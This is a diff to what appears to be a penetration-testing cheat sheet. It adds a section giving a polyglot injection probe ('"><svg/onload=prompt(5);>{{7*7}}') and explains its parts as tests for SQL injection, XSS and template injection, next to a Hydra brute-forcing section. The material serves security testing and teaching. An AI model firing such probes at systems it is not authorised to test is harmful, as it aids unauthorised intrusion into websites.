@@ -142,6 +142,20 @@ mget *
 mget *.txt
 ```
 
+## Simple XSS & SSTI Payload Syntax
+
+```
+'"><svg/onload=prompt(5);>{{7*7}}
+```
+
+'"><svg/onload=prompt(5);>{{7*7}}
+
+' ==> for Sql injection 
+
+"><svg/onload=prompt(5);> ==> for XSS 
+
+{{7*7}} ==> for SSTI/CSTI
+
 ## Hydra Brute-Forcing
 With known user and unknown password:
 ```bash
